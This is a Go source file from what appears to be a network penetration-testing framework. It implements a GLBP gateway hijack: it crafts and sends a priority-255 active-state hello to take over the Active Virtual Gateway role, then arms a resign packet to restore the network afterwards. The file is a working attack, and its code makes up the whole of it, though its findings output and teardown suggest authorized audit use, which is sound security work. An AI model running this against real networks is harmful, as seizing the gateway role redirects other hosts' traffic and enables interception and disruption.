// glbp.go implements the GLBP virtual-router hijack attack behavior.
//
// Durability (from the catalog): temporary-restored. The attack sends a
// GLBP hello with a high priority (255) and the active state to claim the
// AVG (Active Virtual Gateway) role. The teardown arms a resign hello
// (lowered priority, init state) to restore the virtual-router state.
//
// The baseline (l2l3-audit) does not carry a GLBP attack; the craft is
// spec-authored from RFC 7868.

package fh

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type glbpFinding struct {
	Action   string `json:"action"`
	Group    uint16 `json:"group"`
	Priority uint8  `json:"priority"`
	State    string `json:"state"`
	Restore  string `json:"restore"`
}

// RunGLBP arms a resign teardown before sending a high-priority hello for
// the fixed fixture group. It requires the runner's teardown and emitter
// handles and returns craft or send errors with operation context.
func RunGLBP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	group := uint16(1)
	priority := uint8(255)

	// Arm the resign teardown before the first frame.
	resignPkt, err := craftGLBPHello(src, group, 100, nl.GLBPStateInit)
	if err != nil {
		return fmt.Errorf("glbp: craft resign: %w", err)
	}
	deps.Teardown.Arm("glbp-resign", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, resignPkt)
	})

	// Send the hello to claim the active role.
	helloPkt, err := craftGLBPHello(src, group, priority, nl.GLBPStateActive)
	if err != nil {
		return fmt.Errorf("glbp: craft hello: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, helloPkt); err != nil {
		return fmt.Errorf("glbp: send hello: %w", err)
	}

	detail, _ := json.Marshal(glbpFinding{
		Action:   "glbp-hijack",
		Group:    group,
		Priority: priority,
		State:    "active",
		Restore:  "glbp-resign",
	})
	deps.Emitter.Finding("glbp", detail)

	return nil
}

// craftGLBPHello builds a GLBP hello: Ethernet → IPv4 → UDP(3222) → GLBP.
func craftGLBPHello(src net.HardwareAddr, group uint16, priority uint8, state nl.GLBPState) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       glbpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    net.IPv4(224, 0, 0, 102),
	}
	udp := &layers.UDP{
		SrcPort: 3222,
		DstPort: 3222,
	}
	vmac := net.HardwareAddr{0x00, 0x07, 0xb4, 0x00, 0x01, 0x01}
	glbp := &nl.GLBP{
		Version:       1,
		Opcode:        1, // hello
		Group:         group,
		HelloTime:     3000,
		HoldTime:      10000,
		VirtualMAC:    vmac,
		Priority:      priority,
		State:         state,
		AddressFamily: 1, // IPv4
		TLVs: []nl.GLBPTLV{
			{Type: 1, Value: binary.BigEndian.AppendUint16(
				binary.BigEndian.AppendUint16(nil, 3000), 10000)},
		},
	}
	return craftUDPLayer(eth, ip, udp, glbp)
}
